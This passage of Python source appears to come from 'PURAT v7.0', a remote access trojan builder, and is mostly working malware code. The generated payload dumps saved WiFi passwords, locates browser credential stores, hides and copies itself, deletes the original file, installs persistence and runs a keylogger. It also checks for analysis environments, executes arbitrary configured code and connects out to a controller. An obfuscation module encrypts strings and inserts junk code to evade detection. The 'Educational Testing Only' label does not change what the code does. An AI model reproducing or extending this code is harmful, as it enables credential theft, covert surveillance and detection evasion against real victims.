            results.extend(FileExplorer.search_files(f'*{ext}', root_dir, 50))
        
        return results

'''
        
        # Password stealer
        if features.get('password_stealer', False) and platform.system() == "Windows":
            code += '''
class PasswordStealer:
    """Password stealer module"""
    
    @staticmethod
    def get_wifi_passwords():
        """Get saved WiFi passwords"""
        passwords = []
        
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'], 
                capture_output=True, text=True, shell=True
            )
            
            profiles = []
            for line in result.stdout.split('\\n'):
                if 'All User Profile' in line:
                    profile = line.split(':')[1].strip()
                    profiles.append(profile)
            
            for profile in profiles[:10]:  # Limit to 10 profiles
                try:
                    result = subprocess.run(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                        capture_output=True, text=True, shell=True
                    )
                    
                    for line in result.stdout.split('\\n'):
                        if 'Key Content' in line:
                            password = line.split(':')[1].strip()
                            passwords.append({
                                'ssid': profile,
                                'password': password
                            })
                            break
                except:
                    continue
            
        except:
            pass
        
        return passwords
    
    @staticmethod
    def get_browser_passwords():
        """Get browser passwords (simplified)"""
        browsers = {
            'chrome': os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data'),
            'firefox': os.path.expanduser('~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox'),
            'edge': os.path.expanduser('~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data')
        }
        
        browser_data = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                browser_data.append({
                    'browser': browser,
                    'path': path,
                    'exists': True
                })
        
        return browser_data

'''
        
        return code
    
    def _generate_main(self):
        """Generate main execution code"""
        code = '''
# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print(f"""
    ╔══════════════════════════════════════════════╗
    ║         PURAT v7.0 - Advanced RAT            ║
    ║         Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ║
    ║         ID: {SYSTEM_INFO['id']}               ║
    ║         For Educational Testing Only         ║
    ╚══════════════════════════════════════════════╝
    """)
    
    # Check for test mode
    if os.environ.get('PURAT_TEST_MODE') == '1':
        print("[!] Running in test mode")
        return
    
    # Anti-analysis checks
    if AntiAnalysis.should_exit():
        print("[!] Analysis environment detected. Exiting.")
        return
    
    # Get install path
    if CONFIG['basic']['install_path'].startswith('%'):
        # Expand environment variables
        install_dir = os.path.expandvars(CONFIG['basic']['install_path'])
    else:
        install_dir = CONFIG['basic']['install_path']
    
    os.makedirs(install_dir, exist_ok=True)
    install_path = os.path.join(install_dir, CONFIG['basic']['install_name'])
    
    # Install if not already installed
    if not os.path.exists(install_path):
        print(f"[+] Installing to: {install_path}")
        
        try:
            # Copy current file
            shutil.copy2(sys.argv[0], install_path)
            
            # Set hidden attribute on Windows
            if platform.system() == "Windows" and WINDOWS_AVAILABLE:
                try:
                    ctypes.windll.kernel32.SetFileAttributesW(install_path, 2)
                except:
                    pass
            
            print("[+] Installation complete")
            
            # Delete original if configured
            if CONFIG['stealth'].get('delete_original', True):
                try:
                    os.remove(sys.argv[0])
                    print("[+] Original file deleted")
                except:
                    pass
        
        except Exception as e:
            print(f"[-] Installation failed: {e}")
            install_path = sys.argv[0]
    else:
        print(f"[+] Already installed: {install_path}")
    
    # Install persistence
    persistence = PersistenceManager(install_path)
    if CONFIG['basic']['persistence']:
        persistence.install()
    
    # Start features
    network_client = NetworkClient()
    
    # Start keylogger if enabled
    if CONFIG['features'].get('keylogger', False):
        try:
            keylogger = KeyLogger()
            network_client.keylogger = keylogger
            
            keylog_thread = threading.Thread(target=keylogger.start, daemon=True)
            keylog_thread.start()
            print("[+] Keylogger started")
        except Exception as e:
            print(f"[-] Keylogger failed: {e}")
    
    # Start network communication
    print("[+] Starting network communication...")
    network_client.connect()

if __name__ == "__main__":
    # Add custom code from config
    custom_code = CONFIG.get('advanced', {}).get('custom_code', '')
    if custom_code:
        try:
            exec(custom_code)
        except Exception as e:
            print(f"[!] Custom code error: {e}")
    
    # Run main
    try:
        main()
    except KeyboardInterrupt:
        print("\\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
'''
        return code

# ============================================================================
# MODULE 3: OBFUSCATOR (500 lines)
# ============================================================================

class Obfuscator:
    """Code obfuscation engine"""
    
    def __init__(self):
        self.rotation_map = self._create_rotation_map()
        self.xor_keys = self._generate_xor_keys()
    
    def _create_rotation_map(self):
        """Create character rotation map"""
        chars = string.ascii_letters + string.digits + string.punctuation + " "
        rotation_map = {}
        
        for i, char in enumerate(chars):
            rotation_map[char] = chars[(i * 17 + 23) % len(chars)]
            rotation_map[chars[(i * 17 + 23) % len(chars)]] = char
        
        return rotation_map
    
    def _generate_xor_keys(self):
        """Generate XOR keys"""
        keys = []
        seed = hashlib.sha256(b'purat_obfuscation').digest()
        
        for i in range(10):
            key = hashlib.sha256(seed + str(i).encode()).digest()
            keys.append(key[:32])
        
        return keys
    
    def encrypt_strings(self, code):
        """Encrypt strings in code"""
        import re
        
        # Find all strings in code
        string_pattern = r'(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\'|\"[^\"]*\"|\'[^\']*\')'
        
        def encrypt_match(match):
            string = match.group(0)
            
            # Don't encrypt docstrings that start with """
            if string.startswith('\"\"\"') or string.startswith('\'\'\''):
                return string
            
            # Remove quotes
            content = string[1:-1]
            
            # Encrypt
            encrypted = self._encrypt_string(content)
            
            # Return encrypted string
            if string.startswith('"'):
                return f'"{encrypted}"'
            else:
                return f"'{encrypted}'"
        
        # Replace strings
        code = re.sub(string_pattern, encrypt_match, code)
        
        # Add decryption function
        decryption_func = '''
def _decrypt_string(encrypted):
    """Decrypt obfuscated string"""
    try:
        # Custom base64 decode
        custom = "0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        
        decoded = encrypted.translate(str.maketrans(custom, standard))
        padding = 4 - len(decoded) % 4
        if padding != 4:
            decoded += '=' * padding
        
        data = base64.b64decode(decoded)
        
        # XOR decryption
        key = hashlib.sha256(b'purat_obfuscation').digest()
        decrypted = bytearray()
        for i, byte in enumerate(data):
            decrypted.append(byte ^ key[i % len(key)])
        
        # Character rotation
        rotation_map = {}
        chars = string.ascii_letters + string.digits + string.punctuation + " "
        for i, char in enumerate(chars):
            rotation_map[char] = chars[(i * 17 + 23) % len(chars)]
            rotation_map[chars[(i * 17 + 23) % len(chars)]] = char
        
        result = ''.join(rotation_map.get(chr(b), chr(b)) for b in decrypted)
        return result
    except:
        return encrypted

# Replace encrypted strings at runtime
import base64, hashlib, string
'''
        
        # Replace _decrypt_string calls
        code = code.replace('_encrypt_string(content)', '_decrypt_string(content)')
        
        return decryption_func + code
    
    def _encrypt_string(self, text):
        """Encrypt a string"""
        # Character rotation
        rotated = ''.join(self.rotation_map.get(c, c) for c in text)
        
        # XOR encryption
        encrypted = bytearray()
        key = hashlib.sha256(b'purat_obfuscation').digest()
        
        for i, char in enumerate(rotated):
            encrypted.append(ord(char) ^ key[i % len(key)])
        
        # Custom base64
        standard = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        custom = "0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        
        encoded = base64.b64encode(bytes(encrypted)).decode()
        return encoded.translate(str.maketrans(standard, custom))
    
    def obfuscate_code(self, code, level=3):
        """Obfuscate Python code"""
        if level <= 0:
            return code
        
        # Split code into lines
        lines = code.split('\n')
        obfuscated_lines = []
        
        for line in lines:
            # Skip empty lines and comments
            if not line.strip() or line.strip().startswith('#'):
                obfuscated_lines.append(line)
                continue
            
            # Add junk code randomly
            if random.random() < 0.1:  # 10% chance
                junk = self._generate_junk_code()
                obfuscated_lines.append(junk)
            
            obfuscated_lines.append(line)
        
        # Join lines
        obfuscated = '\n'.join(obfuscated_lines)
        
        # Recursive obfuscation
        if level > 1:
            return self.obfuscate_code(obfuscated, level - 1)
        
        return obfuscated
    
    def _generate_junk_code(self):
        """Generate junk code"""
        junk_patterns = [
            'if False: pass',
            'while 0: break',
            'for _ in range(0): continue',
            'try: pass\\nexcept: pass',
            '__dummy__ = lambda x: x',
            '__fake__ = [i for i in range(0)]',
            '__useless__ = {k: v for k, v in {}.items()}',
            'def __junk__(): return None',
            'class __Empty__: pass'
        ]
        
        return random.choice(junk_patterns)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════════════╗
    ║         PURAT v7.0 - Advanced RAT Builder    ║
    ║         Lines: 3500+                         ║
    ║         GUI + Manual Configuration           ║
    ║         For Educational Testing Only         ║
    ╚══════════════════════════════════════════════╝
    """)
    
    if GUI_AVAILABLE:
        app = RATBuilderGUI()
        app.root.mainloop()
    else:
        builder = RATBuilderGUI()
        # Console mode already runs in __init__

if __name__ == "__main__":
    main()
